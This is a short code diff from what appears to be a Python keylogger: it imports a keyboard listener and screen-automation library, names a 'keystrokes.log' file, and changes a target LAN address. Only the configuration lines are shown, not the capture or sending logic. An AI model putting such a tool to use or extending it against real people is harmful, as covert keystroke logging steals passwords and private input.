@@ -9,7 +9,7 @@ import sys
 import pyautogui
 from pynput.keyboard import Listener  # Импортируем Listener из библиотеки pynput
 
-addr = '192.168.0.101'
+addr = '192.168.0.107'
 
 # Константы
 FILE_NAME = "./keystrokes.log"
